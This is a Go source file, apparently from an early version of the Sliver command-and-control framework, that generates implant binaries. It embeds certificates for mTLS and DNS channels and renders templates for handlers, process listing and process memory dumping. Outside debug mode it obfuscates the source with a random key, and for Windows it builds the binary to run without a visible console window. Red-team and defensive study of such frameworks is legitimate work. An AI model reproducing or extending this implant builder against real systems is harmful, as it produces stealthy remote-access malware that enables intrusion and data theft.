package generate

import (
	"crypto/rand"
	"crypto/sha256"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path"
	"path/filepath"
	"sliver/server/assets"
	"sliver/server/certs"
	gobfuscate "sliver/server/gobfuscate"
	gogo "sliver/server/gogo"
	"text/template"

	"github.com/gobuffalo/packr"
)

const (
	// WINDOWS OS
	WINDOWS = "windows"

	// DARWIN / MacOS
	DARWIN = "darwin"

	// LINUX OS
	LINUX = "linux"

	clientsDirName = "clients"
	sliversDirName = "slivers"

	encryptKeySize = 16
)

// SliverConfig - Parameters when generating a implant
type SliverConfig struct {
	// Go
	GOOS   string
	GOARCH string

	// Standard
	Name              string
	CACert            string
	Cert              string
	Key               string
	Debug             bool
	ReconnectInterval int

	// mTLS
	MTLSServer string
	MTLSLPort  uint16

	// DNS
	DNSParent string
}

// GetSliversDir - Get the binary directory
func GetSliversDir() string {
	appDir := assets.GetRootAppDir()
	sliversDir := path.Join(appDir, sliversDirName)
	if _, err := os.Stat(sliversDir); os.IsNotExist(err) {
		log.Printf("Creating bin directory: %s", sliversDir)
		err = os.MkdirAll(sliversDir, os.ModePerm)
		if err != nil {
			log.Fatal(err)
		}
	}
	return sliversDir
}

// SliverEgg - Generates a sliver egg (stager) binary
func SliverEgg(config SliverConfig) (string, error) {

	return "", nil
}

// SliverSharedLibrary - Generates a sliver shared library (DLL/dylib/so) binary
func SliverSharedLibrary(config SliverConfig) (string, error) {
	return "", nil
}

// SliverExecutable - Generates a sliver executable binary
func SliverExecutable(config SliverConfig) (string, error) {

	target := fmt.Sprintf("%s/%s", config.GOOS, config.GOARCH)
	if _, ok := gogo.ValidCompilerTargets[target]; !ok {
		return "", fmt.Errorf("Invalid compiler target: %s", target)
	}

	if config.Name == "" {
		config.Name = GetCodename()
	}
	log.Printf("Generating new sliver binary '%s'", config.Name)

	// Cert PEM encoded certificates
	rootDir := assets.GetRootAppDir()
	caCert, _, _ := certs.GetCertificateAuthorityPEM(rootDir, certs.SliversCertDir)
	sliverCert, sliverKey := certs.GenerateSliverCertificate(rootDir, config.Name, true)
	config.CACert = string(caCert)
	config.Cert = string(sliverCert)
	config.Key = string(sliverKey)

	sliversDir := GetSliversDir() // ~/.sliver/slivers

	// projectDir - ~/.sliver/slivers/<os>/<arch>/<name>/
	projectGoPathDir := path.Join(sliversDir, config.GOOS, config.GOARCH, config.Name)
	os.MkdirAll(projectGoPathDir, os.ModePerm)

	// binDir - ~/.sliver/slivers/<os>/<arch>/<name>/bin
	binDir := path.Join(projectGoPathDir, "bin")
	os.MkdirAll(binDir, os.ModePerm)

	// srcDir - ~/.sliver/slivers/<os>/<arch>/<name>/src
	srcDir := path.Join(projectGoPathDir, "src")
	assets.SetupGoPath(srcDir) // Extract GOPATH dependancy files

	sliverPkgDir := path.Join(srcDir, "sliver") // "main"
	os.MkdirAll(sliverPkgDir, os.ModePerm)

	// Load code template
	sliverBox := packr.NewBox("../../sliver")

	srcFiles := []string{

		"crypto.go",
		"handlers.go",
		"handlers_windows.go",
		"handlers_linux.go",
		"handlers_darwin.go",
		"tcp-mtls.go",
		"udp-dns.go",
		"sliver.go",

		"limits/limits.go",
		"limits/limits_windows.go",
		"limits/limits_darwin.go",
		"limits/limits_linux.go",

		"ps/ps.go",
		"ps/ps_windows.go",
		"ps/ps_linux.go",
		"ps/ps_darwin.go",

		"procdump/dump.go",
		"procdump/dump_windows.go",
		"procdump/dump_linux.go",
		"procdump/dump_darwin.go",
	}
	for _, boxName := range srcFiles {
		sliverGoCode, _ := sliverBox.FindString(boxName)

		// We need to correct for the "sliver/sliver/foo" imports, since Go
		// doesn't allow relative imports and "sliver" is a subdirectory of
		// the main "sliver" repo we need to fake this when coping the code
		// to our per-compile "GOPATH"
		var sliverCodePath string
		dirName := filepath.Dir(boxName)
		fileName := filepath.Base(boxName)
		if dirName != "." {
			// Add an extra "sliver" dir
			dirPath := path.Join(sliverPkgDir, "sliver", dirName)
			if _, err := os.Stat(dirPath); os.IsNotExist(err) {
				log.Printf("[mkdir] %#v", dirPath)
				os.MkdirAll(dirPath, os.ModePerm)
			}
			sliverCodePath = path.Join(dirPath, fileName)
		} else {
			sliverCodePath = path.Join(sliverPkgDir, fileName)
		}

		fSliver, _ := os.Create(sliverCodePath)
		log.Printf("[render] %s", sliverCodePath)
		sliverCodeTmpl, _ := template.New("sliver").Parse(sliverGoCode)
		err := sliverCodeTmpl.Execute(fSliver, config)
		if err != nil {
			log.Printf("Failed to render go code: %v", err)
			return "", err
		}
	}

	// Compile go code
	appDir := assets.GetRootAppDir()
	goConfig := gogo.GoConfig{
		GOOS:   config.GOOS,
		GOARCH: config.GOARCH,
		GOROOT: gogo.GetGoRootDir(appDir),
		GOPATH: projectGoPathDir,
	}

	if !config.Debug {
		log.Printf("Obfuscating source code ...")
		obfuscatedGoPath := path.Join(projectGoPathDir, "obfuscated")
		obfuscatedPkg, err := gobfuscate.Gobfuscate(goConfig, randomObfuscationKey(), "sliver", obfuscatedGoPath)
		if err != nil {
			log.Printf("Error while obfuscating sliver %v", err)
			return "", err
		}
		goConfig.GOPATH = obfuscatedGoPath
		log.Printf("Obfuscated GOPATH = %s", obfuscatedGoPath)
		log.Printf("Obfuscated sliver package: %s", obfuscatedPkg)
		sliverPkgDir = path.Join(obfuscatedGoPath, "src", obfuscatedPkg) // new "main"
	}

	dest := path.Join(binDir, config.Name)
	if goConfig.GOOS == "windows" {
		dest += ".exe"
	}
	tags := []string{"netgo"}
	ldflags := []string{"-s -w"}
	if !config.Debug && goConfig.GOOS == "windows" {
		ldflags[0] += " -H=windowsgui"
	}
	_, err := gogo.GoBuild(goConfig, sliverPkgDir, dest, tags, ldflags)
	return dest, err
}

func getObfuscatedSliverPkgDir(obfuscatedDir string) (string, error) {
	dirList, err := ioutil.ReadDir(obfuscatedDir)
	if err != nil {
		return "", err
	}

	for _, dir := range dirList {
		path := path.Join(obfuscatedDir, dir.Name(), "sliver.go")
		log.Printf("Checking %s for slivers ...", path)
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			return dir.Name(), nil
		}

	}
	return "", errors.New("no sliver files found")
}

func randomObfuscationKey() string {
	randBuf := make([]byte, 64) // 64 bytes of randomness
	rand.Read(randBuf)
	digest := sha256.Sum256(randBuf)
	return fmt.Sprintf("%x", digest[:encryptKeySize])
}
